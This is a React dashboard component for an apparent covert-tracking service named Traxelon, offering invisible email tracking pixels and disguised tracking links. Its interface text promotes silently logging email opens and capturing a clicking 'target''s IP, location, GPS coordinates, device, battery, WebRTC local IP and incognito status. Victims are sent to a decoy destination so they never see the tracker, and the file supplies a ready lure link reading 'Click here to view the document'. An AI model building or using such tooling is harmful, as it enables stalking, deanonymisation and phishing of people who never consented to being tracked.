import React, { useState, useEffect } from "react";
import { useAuth } from "../contexts/AuthContext";
import { db } from "../firebase/config";
import { collection, query, where, onSnapshot, doc } from "firebase/firestore";
import {
  Copy, CheckCircle, Eye, Globe, Mail, Plus,
  ChevronDown, ChevronUp, Link2, ExternalLink,
  AlertCircle, Smartphone, Activity
} from "lucide-react";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

export default function PixelTracker() {
  const { currentUser } = useAuth();
  const [mainTab, setMainTab] = useState("pixel");

  return (
    <div className="min-h-screen bg-surface pt-16 text-text-primary">
      <div className="max-w-5xl mx-auto px-4 py-8">
        <div className="mb-6">
          <h1 className="font-display text-4xl tracking-wider">
            {mainTab === "pixel"
              ? <>PIXEL <span className="text-primary">TRACKER</span></>
              : <>URL <span className="text-primary">TRACKER</span></>
            }
          </h1>
          <p className="font-body text-sm text-text-secondary mt-1">
            {mainTab === "pixel"
              ? "Invisible 1×1 tracking pixels — embed in emails to silently log opens."
              : "Tracking URLs — send in emails to capture full device info + GPS on click."
            }
          </p>
        </div>

        <div className="flex gap-2 mb-8 bg-surface-card border border-surface-border rounded-2xl p-1.5 w-fit">
          <button
            onClick={() => setMainTab("pixel")}
            className={`px-6 py-2.5 rounded-xl font-body text-sm font-semibold transition-all ${
              mainTab === "pixel" ? "bg-primary text-surface shadow-glow" : "text-text-muted hover:text-text-primary"
            }`}
          >
            👁️ Pixel Tracker
          </button>
          <button
            onClick={() => setMainTab("url")}
            className={`px-6 py-2.5 rounded-xl font-body text-sm font-semibold transition-all ${
              mainTab === "url" ? "bg-primary text-surface shadow-glow" : "text-text-muted hover:text-text-primary"
            }`}
          >
            🔗 URL Tracker
          </button>
        </div>

        {mainTab === "pixel"
          ? <PixelTab currentUser={currentUser} />
          : <UrlTab currentUser={currentUser} />
        }
      </div>
    </div>
  );
}

// ── PIXEL TAB ─────────────────────────────────────────────────────────────────
function PixelTab({ currentUser }) {
  const [pixels, setPixels] = useState([]);
  const [label, setLabel] = useState("");
  const [generating, setGenerating] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [copiedId, setCopiedId] = useState(null);
  const [openPixel, setOpenPixel] = useState(null);
  const [activeTab, setActiveTab] = useState({});

  useEffect(() => {
    if (!currentUser) return;
    const q = query(collection(db, "pixelLinks"), where("uid", "==", currentUser.uid));
    const unsub = onSnapshot(q,
      (snap) => {
        const data = snap.docs.map(d => ({ id: d.id, ...d.data() }));
        data.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
        setPixels(data);
      },
      (err) => setError("Firestore error: " + err.message)
    );
    return unsub;
  }, [currentUser]);

  async function handleCreate(e) {
    e.preventDefault();
    setGenerating(true); setError(""); setSuccess("");
    try {
      const res = await fetch(BACKEND_URL + "/api/links/pixel/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uid: currentUser.uid, label: label || "Pixel Tracker" }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      setLabel("");
      setSuccess("Pixel created successfully!");
      setTimeout(() => setSuccess(""), 3000);
    } catch (err) {
      setError(err.message);
    }
    setGenerating(false);
  }

  function copyToClipboard(text, id) {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  }

  function getEmbedCode(pixelUrl) {
    return `<img src="${pixelUrl}" width="1" height="1" style="display:none" alt="" />`;
  }

  function getEmailCode(pixelUrl) {
    return pixelUrl;
  }

  return (
    <>
      <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6">
        {[
          { label: "Total Pixels", value: pixels.length, icon: <Eye className="w-4 h-4" /> },
          { label: "Total Opens", value: pixels.reduce((a, p) => a + (p.totalOpens || 0), 0), icon: <Mail className="w-4 h-4" /> },
          { label: "Unique IPs", value: pixels.reduce((a, p) => a + (p.uniqueIPs?.length || 0), 0), icon: <Globe className="w-4 h-4" /> },
        ].map(stat => (
          <div key={stat.label} className="bg-surface-card border border-surface-border rounded-xl p-4">
            <div className="flex items-center gap-2 text-text-muted mb-2">{stat.icon}<span className="font-body text-xs uppercase tracking-wider">{stat.label}</span></div>
            <div className="font-display text-3xl text-text-primary">{stat.value}</div>
          </div>
        ))}
      </div>

      <div className="bg-primary/5 border border-primary/20 rounded-2xl p-4 mb-6">
        <p className="font-body text-xs text-primary font-semibold uppercase tracking-wider mb-2">📌 Pixel vs URL Tracker</p>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <p className="font-body text-xs text-text-muted mb-1 font-semibold">Pixel (on email open)</p>
            <p className="font-body text-xs text-text-secondary">IP, city, country, ISP, timezone, email client, proxy/VPN, repeat opens — fires automatically</p>
          </div>
          <div>
            <p className="font-body text-xs text-text-muted mb-1 font-semibold">URL Tracker (on click)</p>
            <p className="font-body text-xs text-text-secondary">All of above + GPS, browser, OS, device, screen, battery, 300+ data points</p>
          </div>
        </div>
      </div>

      <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6 mb-6">
        <h2 className="font-display text-xl tracking-wider mb-1">CREATE <span className="text-primary">PIXEL</span></h2>
        <p className="font-body text-xs text-text-muted mb-4">Free — no credits needed. Fires on email open, no click required.</p>

        {error && (
          <div className="flex items-center gap-2 text-red-400 bg-red-500/10 border border-red-500/30 rounded-lg px-3 py-2 mb-4 font-body text-sm">
            <AlertCircle className="w-4 h-4" />{error}
          </div>
        )}
        {success && (
          <div className="flex items-center gap-2 text-green-400 bg-green-500/10 border border-green-500/30 rounded-lg px-3 py-2 mb-4 font-body text-sm">
            <CheckCircle className="w-4 h-4" />{success}
          </div>
        )}

        <form onSubmit={handleCreate} className="flex flex-col md:flex-row gap-3">
          <input
            type="text"
            value={label}
            onChange={e => setLabel(e.target.value)}
            placeholder="Label — e.g. Gmail Campaign, Invoice Email"
            className="flex-1 bg-surface border border-surface-border rounded-xl px-4 py-3.5 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
          />
          <button
            type="submit"
            disabled={generating}
            className="px-6 py-3.5 bg-primary text-surface font-body font-bold rounded-xl hover:bg-primary-dark transition-all shadow-glow disabled:opacity-50 flex items-center gap-2 whitespace-nowrap"
          >
            <Plus className="w-4 h-4" />
            {generating ? "Creating..." : "Create Pixel"}
          </button>
        </form>
      </div>

      <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
        <h2 className="font-display text-xl tracking-wider mb-6">YOUR <span className="text-primary">PIXELS</span></h2>

        {pixels.length === 0 ? (
          <div className="text-center py-16">
            <div className="text-5xl mb-4">👁️</div>
            <p className="font-body text-text-muted">No pixels created yet</p>
            <p className="font-body text-xs text-text-muted mt-1">Create your first pixel above — it's free</p>
          </div>
        ) : (
          <div className="space-y-4">
            {pixels.map(pixel => (
              <div key={pixel.id} className="bg-surface border border-surface-border rounded-2xl overflow-hidden">
                <div
                  className="p-5 flex items-start justify-between gap-3 cursor-pointer hover:bg-primary/5 transition-all"
                  onClick={() => setOpenPixel(openPixel === pixel.id ? null : pixel.id)}
                >
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 mb-2">
                      <span className="font-body text-base font-semibold text-text-primary">{pixel.label}</span>
                      {pixel.totalOpens > 0 && (
                        <span className="text-xs px-2 py-0.5 rounded-full font-mono bg-green-500/10 text-green-400 border border-green-500/20 animate-pulse">● LIVE</span>
                      )}
                    </div>
                    <div className="font-mono text-xs text-text-muted truncate">{pixel.pixelUrl}</div>
                  </div>
                  <div className="flex items-center gap-3 flex-shrink-0">
                    <div className="text-right">
                      <div className="font-display text-xl text-primary">{pixel.totalOpens || 0}</div>
                      <div className="font-body text-xs text-text-muted">opens</div>
                    </div>
                    <div className="text-right">
                      <div className="font-display text-xl text-primary">{pixel.uniqueIPs?.length || 0}</div>
                      <div className="font-body text-xs text-text-muted">unique</div>
                    </div>
                    {openPixel === pixel.id
                      ? <ChevronUp className="w-5 h-5 text-text-muted" />
                      : <ChevronDown className="w-5 h-5 text-text-muted" />
                    }
                  </div>
                </div>

                {openPixel === pixel.id && (
                  <div className="border-t border-surface-border p-5 space-y-4">
                    <div>
                      <div className="flex gap-2 mb-3">
                        {["html", "email"].map(tab => (
                          <button
                            key={tab}
                            onClick={() => setActiveTab(t => ({ ...t, [pixel.id]: tab }))}
                            className={`px-3 py-1.5 rounded-lg font-body text-xs transition-colors ${
                              (activeTab[pixel.id] || "html") === tab
                                ? "bg-primary text-surface font-bold"
                                : "bg-surface border border-surface-border text-text-muted hover:border-primary/40"
                            }`}
                          >
                            {tab === "html" ? "HTML Embed" : "Direct URL"}
                          </button>
                        ))}
                      </div>
                      <div className="relative">
                        <pre className="bg-surface border border-surface-border rounded-xl p-4 font-mono text-xs text-text-secondary overflow-x-auto whitespace-pre-wrap break-all">
                          {(activeTab[pixel.id] || "html") === "html"
                            ? getEmbedCode(pixel.pixelUrl)
                            : getEmailCode(pixel.pixelUrl)
                          }
                        </pre>
                        <button
                          onClick={() => copyToClipboard(
                            (activeTab[pixel.id] || "html") === "html"
                              ? getEmbedCode(pixel.pixelUrl)
                              : getEmailCode(pixel.pixelUrl),
                            pixel.id + "-code"
                          )}
                          className="absolute top-3 right-3 flex items-center gap-1.5 px-3 py-1.5 bg-surface-border text-text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors"
                        >
                          {copiedId === pixel.id + "-code"
                            ? <><CheckCircle className="w-3 h-3 text-green-400" /> Copied!</>
                            : <><Copy className="w-3 h-3" /> Copy</>
                          }
                        </button>
                      </div>
                      <p className="font-body text-xs text-text-muted mt-2">
                        {(activeTab[pixel.id] || "html") === "html"
                          ? "↑ Paste inside email HTML body — fires silently when email is opened, no click needed."
                          : "↑ Direct pixel URL — paste as image source in email clients that support it."
                        }
                      </p>
                    </div>

                    {pixel.hits?.length > 0 ? (
                      <div>
                        <p className="font-body text-xs text-primary uppercase tracking-wider mb-3 pb-1 border-b border-surface-border">
                          📬 {pixel.hits.length} Open{pixel.hits.length > 1 ? "s" : ""} — latest first
                        </p>
                        <div className="space-y-2">
                          {[...pixel.hits].reverse().map((hit, i) => (
                            <div key={i} className="bg-surface-card border border-surface-border rounded-xl p-4">
                              <div className="flex items-start justify-between gap-3 flex-wrap">
                                <div className="flex-1">
                                  <div className="flex items-center gap-2 mb-2 flex-wrap">
                                    <span className="font-body text-sm font-semibold text-text-primary">
                                      {hit.emailClient || "Unknown Client"}
                                    </span>
                                    {hit.isRepeatOpen && <span className="text-xs px-2 py-0.5 rounded-full bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 font-mono">🔁 Repeat</span>}
                                    {hit.isForwarded && <span className="text-xs px-2 py-0.5 rounded-full bg-blue-500/10 text-blue-400 border border-blue-500/20 font-mono">↗ Forwarded</span>}
                                    {hit.isProxy && <span className="text-xs px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 font-mono">🛡 VPN/Proxy</span>}
                                    {hit.isMobileNetwork && <span className="text-xs px-2 py-0.5 rounded-full bg-purple-500/10 text-purple-400 border border-purple-500/20 font-mono">📱 Mobile</span>}
                                  </div>
                                  <div className="grid grid-cols-2 gap-x-6 gap-y-1.5 mt-1">
                                    <DataItem label="IP" value={hit.ip} />
                                    <DataItem label="Country" value={hit.country ? `${hit.country} (${hit.countryCode || ""})` : null} />
                                    <DataItem label="City" value={hit.city} />
                                    <DataItem label="Region" value={hit.region} />
                                    <DataItem label="ISP" value={hit.isp} />
                                    <DataItem label="Org" value={hit.org} />
                                    <DataItem label="ASN" value={hit.asn} />
                                    <DataItem label="Timezone" value={hit.timezone} />
                                    <DataItem label="ZIP" value={hit.zip} />
                                    <DataItem label="Proxy/VPN" value={hit.isProxy != null ? String(hit.isProxy) : null} />
                                    <DataItem label="Hosting" value={hit.isHosting != null ? String(hit.isHosting) : null} />
                                    <DataItem label="Mobile Net" value={hit.isMobileNetwork != null ? String(hit.isMobileNetwork) : null} />
                                    <DataItem label="Browser" value={hit.browser} />
                                    <DataItem label="Browser Ver" value={hit.browserVersion} />
                                    <DataItem label="OS" value={hit.os} />
                                    <DataItem label="Device" value={hit.device} />
                                    <DataItem label="Device Brand" value={hit.deviceBrand} />
                                    <DataItem label="Language" value={hit.acceptLanguage} />
                                    <DataItem label="Referrer" value={hit.referer} />
                                    <DataItem label="DNT" value={hit.dnt} />
                                    <DataItem label="Sec-CH-UA" value={hit.secChUa} />
                                    <DataItem label="Platform" value={hit.secChUaPlatform} />
                                  </div>
                                  {hit.lat && hit.lon && (
                                  <a  
                                      href={`https://www.google.com/maps?q=${hit.lat},${hit.lon}`}
                                      target="_blank"
                                      rel="noreferrer"
                                      className="mt-2 inline-flex items-center gap-1.5 text-xs font-body text-primary hover:underline"
                                    >
                                      <Globe className="w-3 h-3" /> Open in Google Maps ({hit.lat?.toFixed(4)}, {hit.lon?.toFixed(4)})
                                    </a>
                                  )}
                                  <div className="mt-2">
                                    <p className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">User Agent</p>
                                    <p className="font-mono text-xs text-text-secondary break-all">{hit.userAgent || "—"}</p>
                                  </div>
                                </div>
                                <div className="text-right flex-shrink-0">
                                  <div className="font-mono text-xs text-text-muted">
                                    {hit.openedAt ? new Date(hit.openedAt).toLocaleString("en-IN") : ""}
                                  </div>
                                  {hit.timezone && <div className="font-mono text-xs text-text-muted">{hit.timezone}</div>}
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    ) : (
                      <div className="text-center py-8 border border-dashed border-surface-border rounded-xl">
                        <div className="text-3xl mb-2">📭</div>
                        <p className="font-body text-sm text-text-muted">No opens yet</p>
                        <p className="font-body text-xs text-text-muted mt-1">Embed the pixel in an email and send it</p>
                      </div>
                    )}
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </>
  );
}

// ── URL TRACKER TAB ───────────────────────────────────────────────────────────
function UrlTab({ currentUser }) {
  const [links, setLinks] = useState([]);
  const [label, setLabel] = useState("");
  const [destinationUrl, setDestinationUrl] = useState("");
  const [generating, setGenerating] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [copiedId, setCopiedId] = useState(null);
  const [openLink, setOpenLink] = useState(null);
  const [liveCaptures, setLiveCaptures] = useState({});

  useEffect(() => {
    if (!currentUser) return;
    const q = query(collection(db, "trackingLinks"), where("uid", "==", currentUser.uid));
    const unsub = onSnapshot(q,
      (snap) => {
        const data = snap.docs.map(d => ({ id: d.id, ...d.data() }));
        data.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
        setLinks(data);
      },
      (err) => setError("Firestore error: " + err.message)
    );
    return unsub;
  }, [currentUser]);

  // ── FIXED: replaced require() with proper doc import ──────────────────────
  useEffect(() => {
    if (!openLink) return;
    const unsub = onSnapshot(
      doc(db, "trackingLinks", openLink),
      (snap) => {
        if (snap.exists()) {
          setLiveCaptures(prev => ({ ...prev, [openLink]: snap.data().captures || [] }));
        }
      }
    );
    return unsub;
  }, [openLink]);

  function normalizeUrl(raw) {
    const t = raw.trim();
    if (!t) return null;
    if (/^https?:\/\//i.test(t)) return t;
    return "https://" + t;
  }

  async function handleGenerate(e) {
    e.preventDefault();
    if (!destinationUrl.trim()) { setError("Please enter a destination URL"); return; }
    setGenerating(true); setError(""); setSuccess("");
    try {
      const res = await fetch(BACKEND_URL + "/api/links/shorten", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          uid: currentUser.uid,
          label: label || "Email Tracking Link",
          destinationUrl: normalizeUrl(destinationUrl),
        }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      setSuccess(data.trackingUrl);
      setLabel("");
      setDestinationUrl("");
    } catch (err) {
      setError(err.message);
    }
    setGenerating(false);
  }

  function copyToClipboard(text, id) {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  }

  return (
    <>
      <div className="bg-primary/5 border border-primary/20 rounded-2xl p-4 mb-6">
        <p className="font-body text-xs text-primary font-semibold uppercase tracking-wider mb-1">🔗 How URL Tracker works</p>
        <p className="font-body text-xs text-text-secondary">
          Generate a tracking URL with a destination site. Paste it in an email as a clickable link.
          When target clicks → full device info + GPS captured → redirected to destination. Target never sees Traxelon.
        </p>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6">
        {[
          { label: "Total Links", value: links.length, icon: <Link2 className="w-4 h-4" /> },
          { label: "Total Captures", value: links.reduce((a, l) => a + (l.captures?.length || 0), 0), icon: <Smartphone className="w-4 h-4" /> },
          { label: "Total Clicks", value: links.reduce((a, l) => a + (l.clicks || 0), 0), icon: <Activity className="w-4 h-4" /> },
        ].map(stat => (
          <div key={stat.label} className="bg-surface-card border border-surface-border rounded-xl p-4">
            <div className="flex items-center gap-2 text-text-muted mb-2">{stat.icon}<span className="font-body text-xs uppercase tracking-wider">{stat.label}</span></div>
            <div className="font-display text-3xl text-text-primary">{stat.value}</div>
          </div>
        ))}
      </div>

      <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6 mb-6">
        <h2 className="font-display text-xl tracking-wider mb-1">GENERATE <span className="text-primary">TRACKING URL</span></h2>
        <p className="font-body text-xs text-text-muted mb-4">
          Uses 1 credit. Target clicks → 300+ device details + GPS → redirected to destination.
        </p>

        {error && (
          <div className="flex items-center gap-2 text-red-400 bg-red-500/10 border border-red-500/30 rounded-lg px-3 py-2 mb-4 font-body text-sm">
            <AlertCircle className="w-4 h-4" />{error}
          </div>
        )}

        {success && (
          <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 mb-4">
            <p className="font-body text-xs text-green-400 font-semibold flex items-center gap-1.5 mb-2">
              <CheckCircle className="w-4 h-4" /> Tracking URL generated!
            </p>
            <div className="flex items-center gap-2 bg-surface rounded-lg px-3 py-2">
              <Link2 className="w-3.5 h-3.5 text-primary flex-shrink-0" />
              <span className="font-mono text-xs text-primary flex-1 truncate">{success}</span>
              <button
                onClick={() => copyToClipboard(success, "new-url")}
                className="flex items-center gap-1.5 px-3 py-1.5 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors flex-shrink-0"
              >
                {copiedId === "new-url"
                  ? <><CheckCircle className="w-3 h-3" /> Copied!</>
                  : <><Copy className="w-3 h-3" /> Copy URL</>
                }
              </button>
            </div>
            <p className="font-body text-xs text-text-muted mt-2">
              ↑ Paste in email as a clickable link. When target clicks, full device capture happens silently.
            </p>
            <div className="mt-3 bg-surface border border-surface-border rounded-lg p-3">
              <p className="font-body text-xs text-text-muted uppercase tracking-wider mb-2">Ready-to-use HTML link</p>
              <pre className="font-mono text-xs text-text-secondary break-all whitespace-pre-wrap">
                {`<a href="${success}" style="color:#1a73e8;">Click here to view the document</a>`}
              </pre>
              <button
                onClick={() => copyToClipboard(`<a href="${success}" style="color:#1a73e8;">Click here to view the document</a>`, "html-link")}
                className="mt-2 flex items-center gap-1.5 px-3 py-1.5 bg-surface-border text-text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors"
              >
                {copiedId === "html-link"
                  ? <><CheckCircle className="w-3 h-3 text-green-400" /> Copied!</>
                  : <><Copy className="w-3 h-3" /> Copy HTML</>
                }
              </button>
            </div>
          </div>
        )}

        <form onSubmit={handleGenerate} className="space-y-3">
          <div className="flex flex-col md:flex-row gap-3">
            <div className="flex-1 relative">
              <ExternalLink className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-text-muted" />
              <input
                type="text"
                value={destinationUrl}
                onChange={e => setDestinationUrl(e.target.value)}
                placeholder="Destination URL — e.g. google.com, amazon.in"
                className="w-full bg-surface border border-surface-border rounded-xl pl-10 pr-4 py-3.5 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
              />
            </div>
            <input
              type="text"
              value={label}
              onChange={e => setLabel(e.target.value)}
              placeholder="Label (optional)"
              className="md:w-44 bg-surface border border-surface-border rounded-xl px-4 py-3.5 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
            />
            <button
              type="submit"
              disabled={generating}
              className="px-6 py-3.5 bg-primary text-surface font-body font-bold rounded-xl hover:bg-primary-dark transition-all shadow-glow disabled:opacity-50 flex items-center gap-2 whitespace-nowrap"
            >
              <Link2 className="w-4 h-4" />
              {generating ? "Generating..." : "Generate URL"}
            </button>
          </div>
          <p className="font-body text-xs text-text-muted">
            No https:// needed · <span className="text-primary">google.com</span>, <span className="text-primary">amazon.in</span>
          </p>
        </form>
      </div>

      <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
        <h2 className="font-display text-xl tracking-wider mb-6">YOUR TRACKING <span className="text-primary">URLS</span></h2>

        {links.length === 0 ? (
          <div className="text-center py-16">
            <div className="text-5xl mb-4">🔗</div>
            <p className="font-body text-text-muted">No tracking URLs yet</p>
            <p className="font-body text-xs text-text-muted mt-1">Generate your first URL above</p>
          </div>
        ) : (
          <div className="space-y-3">
            {links.map(link => {
              const captures = liveCaptures[link.id] || link.captures || [];
              const isOpen = openLink === link.id;
              return (
                <div key={link.id} className="bg-surface border border-surface-border rounded-2xl overflow-hidden">
                  <div
                    className="p-4 flex items-start justify-between gap-3 cursor-pointer hover:bg-primary/5 transition-all"
                    onClick={() => setOpenLink(isOpen ? null : link.id)}
                  >
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="font-body text-sm font-semibold text-text-primary">{link.label}</span>
                        <span className={`text-xs px-2 py-0.5 rounded-full font-mono border ${
                          link.active
                            ? "bg-green-500/10 text-green-400 border-green-500/20"
                            : "bg-surface-border text-text-muted border-surface-border"
                        }`}>
                          {link.active ? "ACTIVE" : "INACTIVE"}
                        </span>
                      </div>
                      <div className="flex items-center gap-2 bg-surface-card rounded-lg px-3 py-1.5">
                        <Link2 className="w-3 h-3 text-primary flex-shrink-0" />
                        <span className="font-mono text-xs text-primary flex-1 truncate">{link.trackingUrl}</span>
                        <button
                          onClick={e => { e.stopPropagation(); copyToClipboard(link.trackingUrl, link.id); }}
                          className="flex items-center gap-1 px-2 py-1 bg-primary/10 text-primary rounded font-body text-xs hover:bg-primary/20 transition-colors flex-shrink-0"
                        >
                          {copiedId === link.id
                            ? <><CheckCircle className="w-3 h-3" /> Copied</>
                            : <><Copy className="w-3 h-3" /> Copy</>
                          }
                        </button>
                      </div>
                      {link.destinationUrl && (
                        <p className="font-mono text-xs text-text-muted mt-1 truncate">→ {link.destinationUrl}</p>
                      )}
                    </div>
                    <div className="flex items-center gap-3 flex-shrink-0">
                      <div className="text-right">
                        <div className="font-display text-lg text-primary">{link.clicks || 0}</div>
                        <div className="font-body text-xs text-text-muted">clicks</div>
                      </div>
                      <div className="text-right">
                        <div className="font-display text-lg text-primary">{captures.length}</div>
                        <div className="font-body text-xs text-text-muted">captures</div>
                      </div>
                      {isOpen
                        ? <ChevronUp className="w-5 h-5 text-text-muted" />
                        : <ChevronDown className="w-5 h-5 text-text-muted" />
                      }
                    </div>
                  </div>

                  {isOpen && (
                    <div className="border-t border-surface-border p-4">
                      {captures.length === 0 ? (
                        <div className="text-center py-8">
                          <div className="text-3xl mb-2">📭</div>
                          <p className="font-body text-sm text-text-muted">No captures yet</p>
                          <p className="font-body text-xs text-text-muted mt-1">Share the link — when clicked, device info appears here instantly</p>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          <p className="font-body text-xs text-text-secondary uppercase tracking-widest mb-3">
                            {captures.length} Capture{captures.length > 1 ? "s" : ""} — latest first
                          </p>
                          {[...captures].reverse().map((capture, i) => (
                            <div key={i} className="bg-surface-card border border-surface-border rounded-xl p-4">
                              <div className="flex items-start justify-between gap-3 mb-3">
                                <div>
                                  <p className="font-body text-sm font-semibold text-text-primary mb-0.5">
                                    Visitor #{captures.length - i} · {capture.deviceBrand ? capture.deviceBrand + " · " : ""}{capture.device || "Unknown"}
                                  </p>
                                  <p className="font-mono text-xs text-text-muted">
                                    {capture.ip} · {capture.browser} {capture.browserVersion ? "v" + capture.browserVersion : ""}
                                  </p>
                                  <p className="font-mono text-xs text-text-muted">
                                    {capture.capturedAt ? new Date(capture.capturedAt).toLocaleString("en-IN") : ""}
                                  </p>
                                </div>
                                <div className="flex items-center gap-2 flex-shrink-0 flex-wrap justify-end">
                                  {capture.gpsLat && <span className="text-xs px-2 py-0.5 rounded-full bg-green-500/10 text-green-400 border border-green-500/20 font-mono">📍 GPS</span>}
                                  {capture.incognito === "true" && <span className="text-xs px-2 py-0.5 rounded-full bg-purple-500/10 text-purple-400 border border-purple-500/20 font-mono">🕵️ Incognito</span>}
                                  {capture.isProxy && <span className="text-xs px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 font-mono">🛡 VPN</span>}
                                </div>
                              </div>

                              <div className="grid grid-cols-2 gap-x-6 gap-y-1.5">
                                <DataItem label="IP" value={capture.ip} />
                                <DataItem label="Country" value={capture.country} />
                                <DataItem label="City" value={capture.city} />
                                <DataItem label="Region" value={capture.region} />
                                <DataItem label="ISP" value={capture.isp} />
                                <DataItem label="Timezone" value={capture.timezone} />
                                <DataItem label="OS" value={capture.os} />
                                <DataItem label="Browser" value={capture.browser} />
                                <DataItem label="Device" value={capture.device} />
                                <DataItem label="Device Brand" value={capture.deviceBrand} />
                                <DataItem label="CPU Cores" value={capture.cpuCores} />
                                <DataItem label="RAM" value={capture.ram ? capture.ram + " GB" : null} />
                                <DataItem label="Memory Tier" value={capture.memoryTier} />
                                <DataItem label="Screen" value={capture.screenWidth && capture.screenHeight ? `${capture.screenWidth}×${capture.screenHeight}` : null} />
                                <DataItem label="Battery" value={capture.batteryLevel ? capture.batteryLevel + "%" : null} />
                                <DataItem label="Connection" value={capture.connectionType} />
                                <DataItem label="Proxy/VPN" value={capture.isProxy != null ? String(capture.isProxy) : null} />
                                <DataItem label="Incognito" value={capture.incognito} />
                                <DataItem label="Language" value={capture.language} />
                                <DataItem label="Platform" value={capture.platform} />
                                <DataItem label="GPU" value={capture.gpu} />
                                <DataItem label="WebRTC Local IP" value={capture.webrtcLocalIP} />
                              </div>

                              {capture.gpsLat && capture.gpsLon && (
                                <div className="mt-3 pt-3 border-t border-surface-border">
                                  <p className="font-body text-xs text-primary uppercase tracking-wider mb-2">📍 GPS Location</p>
                                  <div className="grid grid-cols-2 gap-x-6 gap-y-1.5 mb-2">
                                    <DataItem label="GPS Lat" value={capture.gpsLat} />
                                    <DataItem label="GPS Lon" value={capture.gpsLon} />
                                    <DataItem label="Accuracy" value={capture.gpsAccuracy ? `±${capture.gpsAccuracy}m` : null} />
                                    <DataItem label="Altitude" value={capture.gpsAltitude} />
                                    <DataItem label="Speed" value={capture.gpsSpeed ? (parseFloat(capture.gpsSpeed) * 3.6).toFixed(1) + " km/h" : null} />
                                    <DataItem label="Address" value={capture.gpsAddress} />
                                    <DataItem label="GPS City" value={capture.gpsCity} />
                                    <DataItem label="GPS State" value={capture.gpsState} />
                                  </div>
                                  <a
                                    href={`https://www.google.com/maps?q=${capture.gpsLat},${capture.gpsLon}`}
                                    target="_blank"
                                    rel="noreferrer"
                                    className="inline-flex items-center gap-1.5 text-xs font-body text-primary hover:underline"
                                  >
                                    <Globe className="w-3 h-3" /> Open in Google Maps
                                  </a>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>
    </>
  );
}

// ── SHARED HELPERS ────────────────────────────────────────────────────────────
function DataItem({ label, value }) {
  if (value == null || value === "" || value === "null" || value === "undefined") return null;
  return (
    <div>
      <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">{label}</div>
      <div className="font-mono text-xs text-text-primary break-all">{String(value)}</div>
    </div>
  );
}